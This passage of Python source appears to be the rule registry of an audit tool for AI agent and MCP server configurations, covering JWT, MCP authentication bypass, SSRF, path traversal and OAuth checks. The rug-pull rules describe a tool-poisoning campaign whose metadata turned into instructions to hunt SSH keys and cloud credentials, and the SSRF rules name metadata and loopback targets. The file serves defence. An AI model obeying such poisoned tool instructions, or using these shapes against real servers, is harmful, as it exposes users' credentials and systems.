    "A2A endpoint using HTTP instead of HTTPS",
    "An A2A agent endpoint uses HTTP instead of HTTPS.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Use HTTPS for all A2A endpoints.",
    sarif_name="A2aHttpEndpoint",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-04"],
    limitations=(
        "Reads `url`, `endpoint`, `baseUrl` and `base_url` on the card and `url` "
        "and `endpoint` on each skill, and matches a value that starts with "
        "`http://`. A plain-HTTP address under `additionalInterfaces`, an OAuth "
        "`tokenUrl`, or a `ws://` endpoint is not read or not matched."
    ),
)

_r(
    "AAK-A2A-005",
    "JWT token lifetime exceeds 1 hour",
    "An A2A Agent Card configures a JWT token lifetime greater than 1 hour (3600 seconds). "
    "Long-lived tokens increase the window for token theft and replay attacks.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Set JWT token lifetime to 1 hour (3600 seconds) or less. Use refresh tokens for longer sessions.",
    sarif_name="JwtTokenLifetimeTooLong",
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `tokenLifetime`, `token_lifetime`, `expiresIn` and `expires_in` "
        "anywhere in the card, as a number of seconds or an `Nh` string. A lifetime "
        "written in days or minutes (`\"7d\"`, `\"120m\"`), as an ISO 8601 duration "
        "(`PT24H`), or under another key (`ttl`, `accessTokenLifetimeSeconds`) is "
        "not read."
    ),
)

_r(
    "AAK-A2A-006",
    "Weak JWT validation configuration",
    "An A2A Agent Card disables JWT signature verification or allows the 'none' algorithm, "
    "permitting token forgery.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Enable signature verification and restrict algorithms to RS256 or ES256. Never allow 'none'.",
    sarif_name="WeakJwtValidation",
    owasp_agentic_references=["ASI03", "ASI07"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `verifySignature` or `verify_signature` set to false, and an "
        "`algorithms` list that contains `none`. `algorithm: none` (singular), "
        "`skipSignatureVerification: true`, `verify: false`, and switched-off "
        "expiry or audience checks (`verify_exp: false`, `verify_aud: false`) are "
        "not read."
    ),
)

_r(
    "AAK-A2A-007",
    "Agent impersonation risk",
    "An A2A Agent Card lacks an 'id' or 'identity' field, or uses an HTTP endpoint, "
    "making it susceptible to agent impersonation attacks.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Add a unique 'id' or 'identity' field to the Agent Card and use HTTPS endpoints.",
    sarif_name="AgentImpersonationRisk",
    owasp_agentic_references=["ASI03", "ASI10"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Checks only that an `id` or `identity` key exists, not what it holds: "
        "`\"id\": \"\"` and `\"identity\": null` both satisfy it, and nothing looks for a "
        "signature or any other proof of the identity. The other condition, an "
        "`http://` address in a top-level `url`, `endpoint`, `baseUrl` or "
        "`base_url`, does not look under `additionalInterfaces`."
    ),
)

# ---------------------------------------------------------------------------
# Legal Compliance (3 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-LEGAL-001",
    "Copyleft license (AGPL/SSPL) in dependency",
    "A dependency uses a copyleft license (AGPL, SSPL) that may impose obligations "
    "on your project.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Review license obligations. Consider replacing with permissively-licensed alternatives.",
    sarif_name="CopyleftLicenseDep",
    limitations=(
        "Reads the `license` field of each `package.json` in the scanned tree and "
        "matches a value that starts with `AGPL`, `SSPL`, `GPL-3` or `EUPL`. "
        "`node_modules` is skipped, so the license of an installed dependency is "
        "not checked, and the legacy `licenses` array is not read."
    ),
)

_r(
    "AAK-LEGAL-002",
    "Dependency with no declared license",
    "A dependency has no declared license, creating legal uncertainty about usage rights.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Contact the maintainer to clarify licensing or replace with a properly licensed alternative.",
    sarif_name="NoLicenseDep",
    limitations=(
        "Reads the `license` key of each `package.json` in the scanned tree and "
        "skips `node_modules`, so an installed dependency with no license is not "
        "checked. Any value counts as declared, an empty string and `UNLICENSED` "
        "included."
    ),
)

_r(
    "AAK-LEGAL-003",
    "DMCA-flagged package detected",
    "A dependency has been flagged for DMCA/IP violations or contains leaked proprietary code.",
    Severity.CRITICAL,
    Category.LEGAL_COMPLIANCE,
    "Remove the flagged dependency immediately.",
    sarif_name="DmcaFlaggedPackage",
    limitations=(
        "Matches three package names (`claude-code-leaked`, `anthropic-internal` "
        "and `copilot-source`, with or without a scope) in the direct dependency "
        "maps of each `package.json`. An `npm:` alias (`\"cc-tools\": "
        "\"npm:claude-code-leaked@^1.0.0\"`), a lockfile entry, a Python requirement "
        "and any other name are not matched."
    ),
)

# ---------------------------------------------------------------------------
# Rug Pull Detection (3 rules) - uses TOOL_POISONING category
# ---------------------------------------------------------------------------

_r(
    "AAK-RUGPULL-001",
    "Tool definition changed since last pin",
    "A tool's definition (name, description, or input schema) has changed since it was "
    "last pinned. This could indicate a rug pull attack. The Deadbugz campaign "
    "(September 2026) is the shape this is for: an MCP server shipped two "
    "innocuous tools, behaved for exactly three tool calls, then rewrote the "
    "metadata it returned into instructions to hunt SSH keys, AWS credentials, "
    "shell history and kubeconfig. Metadata that only turns hostile at runtime "
    "defeats review by construction, because every check you run before "
    "approving the server passes. A pin taken at approval and re-verified "
    "afterwards is what closes that window, and this rule is that comparison.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Review the changes. If legitimate, re-pin with 'agent-audit-kit pin'. If "
    "suspicious, remove the server. Re-run 'agent-audit-kit verify' on a "
    "schedule rather than only at install time: a campaign that waits N calls "
    "before mutating is invisible to a one-off check at approval.",
    sarif_name="ToolDefinitionChanged",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-RUGPULL-01"],
    incident_references=["DEADBUGZ-2026-09"],
    limitations=(
        "Compares the tool definitions written in the MCP config files with "
        "`.agent-audit-kit/tool-pins.json`; what a server returns from `tools/list` "
        "at run time is never compared. The hash covers a tool's name, description "
        "and `inputSchema` only, so a change to its `annotations` (for example "
        "flipping `readOnlyHint`), its `title`, or a schema kept under `parameters` "
        "is not a change here."
    ),
)

_r(
    "AAK-RUGPULL-002",
    "New tool added since last pin",
    "A new tool was added to an MCP server since the last pin. New tools should be "
    "reviewed before approval. The Deadbugz campaign (September 2026) added "
    "capability after approval rather than at install time, which is why the "
    "comparison has to run again after the server is already trusted.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Review the new tool's definition and permissions. If it is expected, run "
    "`agent-audit-kit pin .` to record it in `.agent-audit-kit/tool-pins.json`; if not, "
    "delete its entry from the server's `tools` list. Pinning records every current "
    "tool, so deal with any other drift findings first.",
    sarif_name="NewToolSincePin",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-RUGPULL-02"],
    incident_references=["DEADBUGZ-2026-09"],
    limitations=(
        "Counts only tools declared in a server's `tools` array in a config file. A "
        "server added with just a `command`, whose tools arrive at run time through "
        "`tools/list`, adds no pinned tool, and neither does a tool listed under "
        "`toolDescriptions`, so a new server or a new tool of those shapes is not "
        "reported here."
    ),
)

_r(
    "AAK-RUGPULL-003",
    "Tool removed since last pin",
    "A previously pinned tool was removed from an MCP server. This could indicate "
    "covering tracks after an attack.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Find out why the tool left the server's `tools` list. If the removal is intended, "
    "run `agent-audit-kit pin .` to refresh `.agent-audit-kit/tool-pins.json`; if not, "
    "restore the entry. Pinning records every current tool, so deal with any other "
    "drift findings first.",
    sarif_name="ToolRemovedSincePin",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-RUGPULL-03"],
    limitations=(
        "Counts only tools declared in a server's `tools` array in a config file, "
        "because nothing else is pinned. A server declared with just a `command`, "
        "whose tools arrive at run time through `tools/list`, has no pinned tool, "
        "and neither does a tool listed under `toolDescriptions`, so removing "
        "either is not reported here."
    ),
)


# ---------------------------------------------------------------------------
# 2026 MCP Authentication Bypass Wave (AAK-MCP-011..020)
#
# References:
#   - NVD: CVE-2026-33032 (Nginx-UI MCP endpoint auth bypass, CVSS 9.8) —
#     https://nvd.nist.gov/vuln/detail/CVE-2026-33032
#   - GHSA: https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h6c2-x2m2-mwhf
#   - MCP spec 2025-11-25: OAuth 2.1 mandatory for remote servers.
#   - OWASP MCP Top 10 MCP07:2025 (Insufficient Authentication &
#     Authorization); MCP01:2025 (Token Mismanagement & Secret Exposure) for
#     the token-in-URL rule.
#   - CWE-287 (Improper Authentication), CWE-306 (Missing Authentication),
#     CWE-346 (Origin Validation Error), CWE-307 (Improper Restriction
#     of Excessive Authentication Attempts).
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-011",
    "Remote MCP server handler lacks authentication middleware",
    "A remote MCP server exposes an HTTP handler with no authentication check. "
    "Per MCP spec 2025-11-25 all remote servers must require OAuth 2.1 or an "
    "equivalent bearer credential. Matches the CVE-2026-33032 pattern where "
    "/mcp_message was exposed without the auth middleware that /mcp used.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply the same auth middleware to every MCP HTTP route. Do not branch on "
    "method or path before enforcing auth.",
    sarif_name="McpHandlerNoAuth",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Looks for a FastAPI handler declared as `@app.post(\"/mcp...\")` (or get, "
        "put, patch, delete) directly above a `def` whose parameter list holds no "
        "parenthesis, in a file that names an MCP server class, with no `Depends(` or "
        "`@require_auth` in the 200 characters before it. The same handler declared on "
        "an `APIRouter` (`@router.post(\"/mcp\")`), with another decorator between the "
        "route and the `def`, with a default such as `= Body(...)`, or the FastMCP app "
        "mounted with `app.mount(\"/mcp\", mcp.streamable_http_app())`, is not matched."
    ),
)

_r(
    "AAK-MCP-012",
    "MCP server default IP allowlist is empty (allow-all)",
    "An MCP server's IP allowlist configuration defaults to an empty list, "
    "which its middleware interprets as 'allow all'. This is the exact "
    "CVE-2026-33032 root cause. Tight-by-default is required.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Default to deny-all; require explicit allowlist entries. Reject empty "
    "allowlists at startup.",
    sarif_name="McpAllowlistEmpty",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-02"],
    limitations=(
        "Looks for `ip_allowlist`, `allowed_ips` or `cidr_allowlist` (underscore "
        "optional, any case) assigned a literal empty list, `None`, `null` or `\"\"` "
        "directly. A type-annotated default (`allowed_ips: list[str] = []`) or another "
        "name for the same list (`ip_whitelist = []`) is not matched."
    ),
)

_r(
    "AAK-MCP-013",
    "Wildcard CORS on MCP endpoint",
    "An MCP HTTP endpoint sets Access-Control-Allow-Origin to '*' while also "
    "returning credentials/tokens. This allows hostile origins to read MCP "
    "responses from a victim browser session.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Restrict CORS to an explicit origin allowlist. Never combine '*' with "
    "Access-Control-Allow-Credentials: true.",
    sarif_name="McpCorsWildcard",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-03"],
    limitations=(
        "Looks in one file for the header name `Access-Control-Allow-Origin` followed "
        "by a quoted `\"*\"` and the name `Access-Control-Allow-Credentials` followed "
        "by `true`. The usual framework options (`CORSMiddleware(..., "
        "allow_origins=[\"*\"], allow_credentials=True)`, `cors({ origin: \"*\", "
        "credentials: true })`) do not contain those names and are not matched."
    ),
)

_r(
    "AAK-MCP-014",
    "Auth token transmitted via URL query parameter",
    "An MCP client or server expects authentication tokens in URL query "
    "parameters. Query parameters land in server access logs, browser "
    "history, and referer headers, making this a token-leak vector.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Pass tokens in the Authorization header, never in query params.",
    sarif_name="McpAuthInQueryParam",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-04"],
    limitations=(
        "Looks for `?token=`-style text, `query_params.get(\"token\")` and "
        "`req.query.token` with the names access_token, api_key, token, auth or "
        "bearer. Other ways to read a credential from the query string, `new "
        "URL(req.url).searchParams.get(\"token\")` or Flask's "
        "`request.args.get(\"token\")`, are not matched."
    ),
)

_r(
    "AAK-MCP-015",
    "Path traversal in MCP resource or tool file handler",
    "An MCP server exposes a resource/file handler that passes user-supplied "
    "paths to open()/fs.readFile without normalization or allowlist checks. "
    "2,614 MCP implementations surveyed; 82% had this class of issue. In a "
    "TypeScript tool handler it also follows a destructured tool argument "
    "through `path.join` / `path.resolve` to an fs read or write with no "
    "containment check in between, the shape of CVE-2026-94044.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Resolve the requested path, reject '..' components, and verify the "
    "final path is under an explicit root directory.",
    sarif_name="McpPathTraversal",
    cve_references=[
        # 2026-09-17. CVE-2026-50158 (yutu < 0.10.9, HIGH 7.7, CWE-73): the
        # caption-download tool takes a caller-controlled `file` and hands it
        # to os.Create() without the pkg.Root confinement backed by
        # YUTU_ROOT, so downloaded bytes land on any path the process can
        # write. Not pinnable: yutu is a Go module, and the npm name is an
        # unrelated single-release package.
        "CVE-2026-50158",
        # 2026-09-22. CVE-2026-77248 (mcp-atlassian < 0.22.0, HIGH 8.6, CWE-22
        # + CWE-306): upload_attachment takes an unrestricted file_path, and on
        # the unauthenticated streamable-http transport an anonymous caller
        # reads any file the process can and exfiltrates it as a Jira or
        # Confluence attachment. Also carried by the package's 0.22.0 pin.
        "CVE-2026-77248",
        # 2026-09-26. CVE-2026-94044 (03-lovepreetSingh MCP, HIGH 7.3, CWE-22):
        # create_file in app/api/mcp/route.ts joins the filePath argument onto
        # the upload directory and writes there unchecked. Deferred the same day
        # because nothing fired on the upstream file; the TypeScript tool-handler
        # arm now reports all four of its file tools. Not pinnable: the package
        # is private and unversioned.
        "CVE-2026-94044",
    ],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-RES-01"],
    limitations=(
        "Regex and proximity, not data flow. The TypeScript arm follows one "
        "`path.join` / `path.resolve` from a destructured tool argument to an fs "
        "read or write within one handler-sized window, so a path assembled "
        "through helper functions is missed. It stays silent on a containment "
        "check it recognises (`startsWith`, `path.relative`, `realpath`) and on "
        "any `if` naming the joined path that throws or returns, by design, so a "
        "weak check can silence it; `path.basename()` around the argument counts "
        "as sanitizing."
    ),
)

_r(
    "AAK-MCP-016",
    "Unbounded prompt/argument size on MCP endpoint",
    "An MCP server endpoint accepts request bodies without a maximum-size "
    "limit. This enables token-cost denial-of-service and memory exhaustion.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set a per-endpoint max body size (e.g. 1 MiB by default) and reject "
    "requests that exceed it.",
    sarif_name="McpUnboundedPayload",
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-DOS-01"],
)

_r(
    "AAK-MCP-017",
    "MCP server accepts HTTP (non-TLS) in production config",
    "An MCP server configuration binds to plain HTTP without TLS. MCP spec "
    "2025-11-25 requires Streamable HTTP over TLS for remote servers.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Bind only to HTTPS. Terminate TLS at a trusted proxy or use the server's "
    "native TLS support. Reject plain-HTTP binds in production mode.",
    sarif_name="McpPlainHttp",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-TRANSPORT-01"],
    limitations=(
        "Examines only files that contain createServer, McpServer, createMcpHandler, "
        "mcp.ServeHTTP, FastMCP or Server.run_streamable_http. In them it looks for a "
        "call to listen, bind or serve whose first argument is an `http://` URL that "
        "contains a digit or a dot. A server started the usual way, without a URL "
        "string (`uvicorn.run(app, host=\"0.0.0.0\", port=8080)`, `app.listen(8080)`), "
        "and the same call in a file that names none of those, are not matched."
    ),
)

_r(
    "AAK-MCP-018",
    "Missing rate limiting on MCP endpoint",
    "An MCP server endpoint does not declare rate limiting. Unrestricted "
    "access allows credential stuffing and enumeration attacks.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Add per-IP and per-token rate limits to the server that declares the `/mcp` route, "
    "and answer bursts with 429. This check looks for `ratelimit`, `rate_limit`, "
    "`throttle` or `limiter` in the same file as the route, so a limit enforced only at "
    "a gateway or reverse proxy is not seen; in that case accept the finding under "
    "`exclude-rules` in `.agent-audit-kit.yml`.",
    sarif_name="McpNoRateLimit",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-DOS-02"],
    limitations=(
        "Fires on a file that names an MCP server class and contains the text `/mcp` "
        "but none of the words ratelimit, rate_limit, throttle or limiter. A server "
        "that never writes `/mcp` is not examined, and the word in a comment (`# TODO: "
        "add rate_limit middleware`) counts as rate limiting."
    ),
)

_r(
    "AAK-MCP-019",
    "MCP auth check runs after side-effect",
    "An MCP handler performs work (e.g. db lookups, external calls) before "
    "verifying authentication. This reveals existence/shape of protected "
    "resources via timing and error channels.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Enforce authentication as the first step of every handler. Do not branch "
    "on caller input before the auth check.",
    sarif_name="McpAuthAfterSideEffect",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-05"],
)

_r(
    "AAK-MCP-020",
    "MCP handler shares routing with an unauthenticated path",
    "Two MCP HTTP routes share a single handler but only one is wrapped in "
    "auth middleware. The second route inherits the tool surface without the "
    "auth check. This is the CVE-2026-33032 bypass pattern.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply auth middleware at the router level, not per-route. Or, wrap the "
    "shared handler in the auth check.",
    sarif_name="McpSharedHandlerAuthGap",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

# ---------------------------------------------------------------------------
# MCP SSRF Patterns (AAK-SSRF-001..005)
#
# References:
#   - 36.7% of 7,000 surveyed MCP servers had SSRF-exposed tool handlers.
#   - OWASP MCP Top 10 MCP05:2025 (Command Injection & Execution), whose
#     text covers API requests built from untrusted input. The MCP Top 10 has
#     no SSRF entry (OWASP/www-project-mcp-top-10 issue #20 is open), so this
#     placement is AAK's reading, not OWASP's.
#   - OWASP Top 10 A10:2021 (SSRF).
#   - CWE-918 (Server-Side Request Forgery).
# ---------------------------------------------------------------------------

_r(
    "AAK-SSRF-001",
    "Unvalidated outbound HTTP in MCP tool handler",
    "An MCP tool handler fetches a URL provided by the caller with no "
    "host/scheme validation. This is the classic SSRF shape (CWE-918).",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Validate the scheme (https only), resolve the host, and reject "
    "private-range IPs (RFC 1918, 169.254.*, 127.*, ::1/128, fc00::/7).",
    sarif_name="SsrfUnvalidatedUrl",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads only files that contain `createTool`, `McpServer`, `FastMCP`, "
        "`mcp.tool` or `Server.run_streamable_http`; in Python a fetch's URL counts as "
        "caller input only when it is, or is assigned somewhere in the file from, an "
        "expression rooted at input, args, params, kwargs, request, req, event, "
        "tool_input, arguments, payload, body or query, so a tool's own `url` "
        "parameter, or a value handed to a helper that calls `requests.get`, is not "
        "followed. A fetch is `requests.get/post/put/delete/head/request`, "
        "`httpx.get/post/put/delete/request/stream`, `urllib.request.urlopen`, "
        "`aiohttp.request`, or `get`/`post` on something called `session` or `client`, "
        "so `http.get(...)` and `requests.patch(...)` are missed, and a `urlparse(` "
        "call, a `startswith(\"https` or `scheme != \"https` check, a `scheme = "
        "\"https` assignment or an allow-list name from AAK-SSRF-005 anywhere in the "
        "file counts as validation, although an https prefix still allows internal "
        "hosts. In TypeScript only `req.query`, `req.body`, `req.params`, "
        "`request.json`, `event.body`, `tool_input`, `arguments`, `input`, and "
        "`params[` or `args[` directly followed by a letter, digit or underscore "
        "(`args[key]`), count as caller input, so `fetch(args.url)` and "
        "`fetch(args[\"url\"])` are missed."
    ),
)

_r(
    "AAK-SSRF-002",
    "Localhost/loopback reachable from MCP tool",
    "An MCP tool handler forwards user-supplied URLs that could target "
    "127.0.0.1/localhost/::1, reaching internal services bound to loopback.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Take the loopback or private address out of the outbound call's URL: use the real "
    "public host, or read the target from configuration. The rule matches `localhost`, "
    "`127.0.0.1`, `0.0.0.0`, `::1`, `10.x`, `172.16.x` to `172.31.x` and `192.168.x`. "
    "Where the URL can also come from the caller, resolve the host and refuse loopback, "
    "private and link-local results before connecting.",
    sarif_name="SsrfLoopbackReachable",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-02"],
    limitations=(
        "Reads only files that contain `createTool`, `McpServer`, `FastMCP`, "
        "`mcp.tool` or `Server.run_streamable_http`. It looks for the text 127.0.0.1, "
        "localhost, ::1, 0.0.0.0 or a 10.x, 172.16-31.x or 192.168.x address in a "
        "string that reaches a recognised fetch call. Other spellings of loopback and "
        "private space (`127.0.0.2`, the decimal form `http://2130706433/`, an IPv6 "
        "unique-local address such as `[fd12:3456::7]`) are not matched, and a file "
        "gets one finding, for the first matching call (in `ast.walk` order in "
        "Python), so a loopback fetch that follows a metadata fetch is reported as "
        "AAK-SSRF-003 alone."
    ),
)

_r(
    "AAK-SSRF-003",
    "Cloud metadata endpoint reachable via MCP tool",
    "An MCP tool accepts URLs that can reach 169.254.169.254 (AWS/Azure/GCP "
    "metadata) or metadata.google.internal, allowing exfiltration of "
    "instance credentials.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Block 169.254.0.0/16 and metadata.google.internal at the HTTP client "
    "layer. Use a deny-by-default IP allowlist.",
    sarif_name="SsrfCloudMetadata",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-03"],
    limitations=(
        "Reads only files that contain `createTool`, `McpServer`, `FastMCP`, "
        "`mcp.tool` or `Server.run_streamable_http`. It recognises `169.254.169.254` "
        "and `metadata.google.internal` only. Other cloud credential endpoints "
        "(`169.254.170.2`, `100.100.100.200`) are not matched, and a file gets one "
        "finding, for the first matching call (in `ast.walk` order in Python), so a "
        "metadata fetch that follows a loopback fetch is reported as AAK-SSRF-002 "
        "alone."
    ),
)

_r(
    "AAK-SSRF-004",
    "Redirect chains followed without re-validation",
    "An MCP tool follows HTTP redirects using the default client settings. "
    "An attacker can bypass initial host checks by returning a 3xx to an "
    "internal address. DNS rebinding works the same way.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Disable automatic redirects, or re-run host validation on every hop. "
    "Cap total redirects at 3.",
    sarif_name="SsrfRedirectRevalidation",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-04"],
    limitations=(
        "Reads only files that contain `createTool`, `McpServer`, `FastMCP`, "
        "`mcp.tool` or `Server.run_streamable_http`. It fires on an explicit "
        "`follow_redirects=True`, `allow_redirects=True` or `redirect: \"follow\"` in "
        "a file with a recognised fetch call. A client left at its default, which "
        "follows redirects (`requests.get(url)`), is not reported."
    ),
)

_r(
    "AAK-SSRF-005",
    "Missing SSRF allowlist on outbound fetch",
    "An MCP tool performs outbound HTTP but has no allowlist of permitted "
    "destinations. Deny-by-default with an explicit allowlist is the only "
    "reliable defense against SSRF chains.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Check the URL's host against an explicit allowlist before the request and reject "
    "any other host. Keep the list in a variable this check recognises: "
    "`ALLOWED_HOSTS`, `ALLOWED_HOST`, `ALLOW_HOSTS`, `ALLOW_HOST`, `URL_ALLOW_LIST`, "
    "`allowed_hosts` or `allowlist`; a list under another name is not seen.",
    sarif_name="SsrfNoAllowlist",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-05"],
    limitations=(
        "Reads only files that contain `createTool`, `McpServer`, `FastMCP`, "
        "`mcp.tool` or `Server.run_streamable_http`. It fires on a recognised fetch "
        "call whose URL derives from caller input, in a file that never writes "
        "ALLOW_HOST, ALLOW_HOSTS, ALLOWED_HOST, ALLOWED_HOSTS or URL_ALLOW_LIST (upper "
        "case), `allowed_hosts =` or `allowlist =` (lower case). Declaring one of "
        "those names is enough: nothing checks that the list is applied to the URL."
    ),
)

# ---------------------------------------------------------------------------
# OAuth 2.1 Misconfiguration (AAK-OAUTH-001..005)
#
# References:
#   - MCP spec 2025-11-25: OAuth 2.1 mandatory, PKCE+S256 required,
#     DPoP under SEP review.
#   - RFC 9700 (OAuth 2.1 Security BCPs).
#   - RFC 9449 (DPoP).
#   - OWASP MCP07:2025 (Insufficient Authentication & Authorization);
#     MCP01:2025 (Token Mismanagement & Secret Exposure) where the defect is
#     an unbound or static token.
#   - CWE-287 (Improper Authentication), CWE-522 (Credentials Transmitted
#     in Cleartext), CWE-348 (Use of Less Trusted Source).
# ---------------------------------------------------------------------------

_r(
    "AAK-OAUTH-001",
    "OAuth flow without PKCE",
    "An OAuth 2.1 client flow does not use PKCE. PKCE is mandatory for all "
    "MCP remote server clients per spec 2025-11-25, including confidential "
    "clients.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add a code_verifier/code_challenge pair to every authorization request. "
    "Use code_challenge_method=S256.",
    sarif_name="OAuthMissingPkce",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-06"],
    limitations=(
        "Fires on a call to `authorize(` or the name `authorization_endpoint` in a "
        "file that has no whole word `code_verifier` or `pkce` and no `code_challenge` "
        "outside `code_challenge_method`. An authorization URL written out as a "
        "literal (`https://auth.example.com/authorize?response_type=code`) is not "
        "recognised as an authorization request."
    ),
)

_r(
    "AAK-OAUTH-002",
    "PKCE using the plain challenge method",
    "An OAuth client sets code_challenge_method=plain (or omits it). S256 "
    "is mandatory; 'plain' leaks the verifier to anyone with access to the "
    "authorization request.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Set code_challenge_method=S256 and derive code_challenge as "
    "BASE64URL(SHA256(code_verifier)).",
    sarif_name="OAuthPkcePlain",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-07"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it fires "
        "only when `code_challenge_method` is assigned the literal `plain` "
        "(`code_challenge_method=plain`, `\"code_challenge_method\": \"plain\"`). A "
        "request that sends a `code_challenge` with no method at all, which RFC 7636 "
        "treats as plain, one that takes the method from a constant (`METHOD = "
        "\"plain\"`), and the same literal in a file with none of those words, are not "
        "reported."
    ),
)

_r(
    "AAK-OAUTH-003",
    "OAuth token passthrough between tenants",
    "An MCP server receives a bearer token from one identity and forwards "
    "it to a downstream service without re-minting. This is the 'confused "
    "deputy' shape banned by OAuth 2.1 BCPs.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Use token-exchange (RFC 8693) or a service account to call downstream "
    "services. Never forward a user token across trust boundaries.",
    sarif_name="OAuthTokenPassthrough",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-08"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it "
        "matches a dict entry `\"Authorization\": request.headers[...]` (quoted key, "
        "header read by subscript; also req, event, input) and any assignment "
        "`headers[\"Authorization\"] = request....`. A dict entry read with `.get` or "
        "as a property (`req.headers.authorization`), one with an unquoted key (`{ "
        "Authorization: req.headers[\"authorization\"] }`), and the same forwarding in "
        "a file with none of those words, are not matched."
    ),
)

_r(
    "AAK-OAUTH-004",
    "Wildcard or overly-broad redirect_uri",
    "An OAuth client registers a wildcard, localhost-with-any-port, or "
    "overly-broad redirect_uri. Attackers can hijack authorization codes "
    "via dangling subdomains or open redirectors.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Register exact-match redirect URIs only. No wildcards.",
    sarif_name="OAuthWildcardRedirect",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-09"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it "
        "matches a `redirect_uri` or `redirect_uris` value of `*` or `[\"*\"]`, one "
        "that begins with `https://*` or `http://*`, or one that begins with "
        "`http://localhost`. A wildcard URL inside a list "
        "(`[\"https://*.example.com/callback\"]`), a trailing wildcard "
        "(`\"https://app.example.com/*\"`) and a file with none of those words are not "
        "matched."
    ),
)

_r(
    "AAK-OAUTH-005",
    "Bearer token used where DPoP or mTLS is required",
    "An MCP remote server accepts plain Bearer tokens on a flow that MCP "
    "spec 2025-11-25 flags for DPoP (Demonstrating Proof of Possession) "
    "or mTLS-bound tokens. A stolen Bearer token is fully replayable.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Require DPoP proofs or mTLS-bound tokens for high-privilege flows. "
    "Validate the token's cnf claim.",
    sarif_name="OAuthBearerWhereDpopRequired",
